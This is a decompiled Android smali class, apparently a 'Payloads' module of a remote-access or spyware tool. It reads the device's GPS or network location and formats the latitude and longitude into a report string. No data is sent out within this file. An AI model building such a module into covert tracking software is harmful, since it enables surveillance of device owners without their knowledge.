.class public Lcom/android/ld/Payloads/locManager;
.super Ljava/lang/Object;
.source "locManager.java"


# instance fields
.field activity:Landroid/app/Activity;

.field context:Landroid/content/Context;

.field isGPSEnabled:Z

.field isNetworkEnabled:Z

.field latitude:Ljava/lang/Double;

.field location:Landroid/location/Location;

.field longitude:Ljava/lang/Double;

.field mLocationManager:Landroid/location/LocationManager;


# direct methods
.method public constructor <init>(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "activity"    # Landroid/app/Activity;

    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 20
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/ld/Payloads/locManager;->isGPSEnabled:Z

    .line 21
    iput-boolean v0, p0, Lcom/android/ld/Payloads/locManager;->isNetworkEnabled:Z

    .line 28
    iput-object p1, p0, Lcom/android/ld/Payloads/locManager;->context:Landroid/content/Context;

    .line 29
    iput-object p2, p0, Lcom/android/ld/Payloads/locManager;->activity:Landroid/app/Activity;

    .line 30
    return-void
.end method


# virtual methods
.method public geolocate()Ljava/lang/String;
    .locals 7

    .line 98
    const-string v0, ""

    .line 99
    .local v0, "result":Ljava/lang/String;
    const-string v1, ""

    .line 100
    .local v1, "lat":Ljava/lang/String;
    const-string v2, ""

    .line 101
    .local v2, "lon":Ljava/lang/String;
    const-string v3, ""

    .line 102
    .local v3, "whichOne":Ljava/lang/String;
    invoke-virtual {p0}, Lcom/android/ld/Payloads/locManager;->location_init()V

    .line 104
    iget-boolean v4, p0, Lcom/android/ld/Payloads/locManager;->isNetworkEnabled:Z

    const-string v5, "\n"

    if-eqz v4, :cond_0

    iget-boolean v4, p0, Lcom/android/ld/Payloads/locManager;->isGPSEnabled:Z

    if-eqz v4, :cond_0

    .line 105
    invoke-virtual {p0}, Lcom/android/ld/Payloads/locManager;->getGPSLocation()V

    .line 106
    const-string v3, "GPS & Network Location\n"

    .line 107
    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    .line 108
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 109
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 110
    const-string v4, "lot3"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 113
    :cond_0
    iget-boolean v4, p0, Lcom/android/ld/Payloads/locManager;->isGPSEnabled:Z

    if-eqz v4, :cond_1

    .line 114
    invoke-virtual {p0}, Lcom/android/ld/Payloads/locManager;->getGPSLocation()V

    .line 115
    const-string v3, "GPS Location\n"

    .line 116
    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    .line 117
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 118
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 119
    const-string v4, "lot1"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 122
    :cond_1
    iget-boolean v4, p0, Lcom/android/ld/Payloads/locManager;->isNetworkEnabled:Z

    if-eqz v4, :cond_2

    .line 123
    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->activity:Landroid/app/Activity;

    new-instance v6, Lcom/android/ld/Payloads/locManager$3;

    invoke-direct {v6, p0}, Lcom/android/ld/Payloads/locManager$3;-><init>(Lcom/android/ld/Payloads/locManager;)V

    invoke-virtual {v4, v6}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 129
    const-string v3, "Network Location\n"

    .line 130
    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    .line 131
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 132
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 133
    const-string v4, "lot2"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 136
    :cond_2
    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    .line 137
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "Latitude is "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "Longitude is "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    .line 139
    :cond_3
    const-string v0, "Not able to get Network Location and GPS is disbled\n"

    .line 141
    :goto_1
    return-object v0
.end method

.method public getGPSLocation()V
    .locals 2

    .line 65
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->activity:Landroid/app/Activity;

    new-instance v1, Lcom/android/ld/Payloads/locManager$2;

    invoke-direct {v1, p0}, Lcom/android/ld/Payloads/locManager$2;-><init>(Lcom/android/ld/Payloads/locManager;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 85
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->mLocationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_0

    .line 86
    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->location:Landroid/location/Location;

    .line 88
    if-eqz v0, :cond_0

    .line 89
    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    .line 90
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    .line 94
    :cond_0
    return-void
.end method

.method public getNetworkLocation()V
    .locals 6

    .line 40
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->mLocationManager:Landroid/location/LocationManager;

    new-instance v5, Lcom/android/ld/Payloads/locManager$1;

    invoke-direct {v5, p0}, Lcom/android/ld/Payloads/locManager$1;-><init>(Lcom/android/ld/Payloads/locManager;)V

    const-string v1, "network"

    const-wide/32 v2, 0xea60

    const/high16 v4, 0x41200000    # 10.0f

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    .line 54
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->mLocationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_0

    .line 55
    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->location:Landroid/location/Location;

    .line 57
    if-eqz v0, :cond_0

    .line 58
    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->latitude:Ljava/lang/Double;

    .line 59
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->longitude:Ljava/lang/Double;

    .line 62
    :cond_0
    return-void
.end method

.method public location_init()V
    .locals 2

    .line 33
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->context:Landroid/content/Context;

    const-string v1, "location"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    iput-object v0, p0, Lcom/android/ld/Payloads/locManager;->mLocationManager:Landroid/location/LocationManager;

    .line 34
    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    iput-boolean v0, p0, Lcom/android/ld/Payloads/locManager;->isGPSEnabled:Z

    .line 35
    iget-object v0, p0, Lcom/android/ld/Payloads/locManager;->mLocationManager:Landroid/location/LocationManager;

    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    iput-boolean v0, p0, Lcom/android/ld/Payloads/locManager;->isNetworkEnabled:Z

    .line 36
    return-void
.end method
